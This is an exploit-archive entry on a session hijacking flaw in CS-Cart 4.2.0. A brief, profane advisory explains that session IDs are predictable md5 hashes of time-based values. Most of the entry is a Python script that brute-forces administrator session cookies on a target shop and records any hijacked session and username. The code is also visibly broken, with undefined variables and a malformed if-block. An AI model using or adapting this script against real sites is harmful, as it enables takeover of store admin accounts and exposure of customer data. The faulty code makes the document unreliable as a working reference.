@@ -1,0 +1,133 @@
+id: 22513
+date: 08/13/2014
+title: CS-Cart 4.2.0 Session Hijacking Vulnerability
+author: Nik Cubrilovic
+cves: 
+
+Vendor: CS-Cart
+Homepage: https://www.cs-cart.com
+Fixed in: v4.2.1
+Released: July 22nd 2014
+
+CS-Cart is 127MB of shitty PHP and HTML code that is supposed to
+function as a secure e-commerce site. It is developed by people who
+don't reply to emails but who covertly patch bugs reported to them and
+then don't tell anyone about it. For some reason a lot of people run
+it, and pay for it, and store customer credit cards in it.
+
+In versions up to v4.2.0 the session ID is nothing more than the md5
+hash of uniqid() with time() passed to it. Turns out uniqid() is
+itself nothing more than a call to time(), and that makes a horrible
+session ID.
+
+Other bugs mean you can trigger session regeneration with a URL,
+meaning you can narrow down the brute force search space.
+
+Blog post explainer with exploit etc. here:
+
+https://www.nikcub.com/posts/cs-cart-v4-2-0-session-hijacking-and-other-vulnerabilities/
+
+Vendor changelog with no mention of security:
+
+http://www.cs-cart.com/changelog421.html
+
+
+---------------
+Exploit:
+
+#!/usr/bin/env python
+# CS-Cart session brute force exploit for v4.2.0
+# see https://www.nikcub.com/posts/cs-cart-v4-2-0-session-hijacking-and-other-vulnerabilities/
+
+import sys
+import requests
+import argparse
+import re
+import string
+import random
+import hashlib
+
+from BeautifulSoup import BeautifulSoup
+
+target_host = "cscart.dev"
+target_ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:20.0) Gecko/20100101 Firefox/20.0"
+target_start_time = 1402325013 # timestamp seconds set to when link was clicked + 3-4 seconds for login.
+
+# change nothing below.
+
+session_name = False
+session_value = False
+cookies = {}
+
+
+headers = {
+  "Host": target_host,
+  "User-Agent": target_ua,
+  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "Accept-Language": "en-US,en;q=0.5",
+  "Accept-Encoding": "gzip, deflate"
+}
+
+
+proxies = proxy_none
+req_base = 'http://' + host
+req_url = req_base + '/admin.php'
+
+def extract_username(html_doc):
+  soup = BeautifulSoup(html_doc)
+  menu = soup.find("ul", "dropdown-menu pull-right").find("li").find("a")
+  if menu:
+    return re.search(r'<br />(.*?)</a>', str(menu), re.DOTALL).group(1).strip()
+  return 'Not Found'
+
+def rand_string(n=5):
+  return ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(n))
+
+def save_doc(tid, txt):
+  f = open(tid + '_' + rand_string() + '.txt', 'w')
+  f.write(txt.encode('ascii', 'ignore'))
+  f.close()
+
+def req_att(path, cookie):
+  cookies[session_name] = cookie
+  r = requests.get(req_base + path, headers=headers, allow_redirects=False)
+
+def calc_session_name(host):
+  return hashlib.md5(host).hexdigest()[:5]
+
+def gen_value(basetime, usec):
+  return hashlib.md5("%s%08x%05x" % (basetime, basetime, usec)).hexdigest() + "_0_A"
+
+def req_generator(startat):
+  usec = 0
+  startat = startat
+  while True:
+    r = gen_value(startat, usec)
+    usec += 1
+    if (usec%10000) == 0:
+      #  print progress every 100000
+      print '.'
+    if usec >= 100000:
+      usec = 0
+      startat += 1
+    yield r
+
+session_name = calc_session_name(req_base)
+
+def fetch(cookie):
+  # cookies = {cookie_name, cookie}
+  headers['Cookie'] = cookie_name + '=' + cookie
+  try:
+    response = requests.request('GET', req_url, headers=headers, proxies=proxies, timeout=30.0, allow_redirects=False)
+    if response.status_code != 302:
+    print "FOUND: " + session_name + "=" + session_guess
+    save_doc(host + '_' + session_guess, "\n".join(r.headers) + "\n" + r.text)
+    print "Wrote file backup"
+    print "Signed in as: " + extract_username(r.text)
+  except Exception, e:
+    pass
+
+for url in req_generator(target_start_time):
+  fetch(url)
+
+#  0day.today [2023-03-21]  #
